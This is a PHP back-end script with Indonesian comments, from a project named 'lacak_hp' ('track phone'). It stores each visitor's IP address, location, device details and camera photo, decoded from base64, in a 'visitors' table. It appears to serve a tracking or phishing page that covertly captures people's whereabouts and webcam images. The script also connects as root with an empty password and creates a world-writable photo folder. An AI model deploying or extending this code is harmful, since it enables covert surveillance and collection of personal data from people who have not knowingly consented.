<?php

// ===============================
// KONFIGURASI DATABASE
// ===============================
$host = "localhost";
$user = "root";
$pass = "";
$db   = "lacak_hp";

// ===============================
// KONEKSI DATABASE
// ===============================
$conn = new mysqli($host, $user, $pass, $db);

if ($conn->connect_error) {
    die("Koneksi gagal: " . $conn->connect_error);
}

// ===============================
// AMBIL DATA POST
// ===============================
$ip        = $_POST['ip_address'] ?? 'unknown';
$lokasi    = $_POST['lokasi'] ?? 'unknown';
$perangkat = $_POST['perangkat'] ?? 'unknown';
$foto      = $_POST['foto'] ?? '';

// ===============================
// BUAT FOLDER FOTO JIKA BELUM ADA
// ===============================
$folder = "foto/";

if (!file_exists($folder)) {
    mkdir($folder, 0777, true);
}

// ===============================
// SIMPAN FOTO
// ===============================
$namaFoto = "tidak_ada_foto.png";

if (!empty($foto) && $foto != "kamera ditolak") {

    $foto = str_replace('data:image/png;base64,', '', $foto);
    $foto = str_replace(' ', '+', $foto);

    $data = base64_decode($foto);

    $namaFoto = "foto_" . time() . ".png";

    file_put_contents($folder . $namaFoto, $data);
}

// ===============================
// SIMPAN KE DATABASE
// ===============================
$stmt = $conn->prepare("
    INSERT INTO pengunjung 
    (ip_address, lokasi, perangkat, foto)
    VALUES (?, ?, ?, ?)
");

$stmt->bind_param("ssss", $ip, $lokasi, $perangkat, $namaFoto);

if ($stmt->execute()) {
    echo "SUKSES";
} else {
    echo "GAGAL";
}

// ===============================
$stmt->close();
$conn->close();

?>
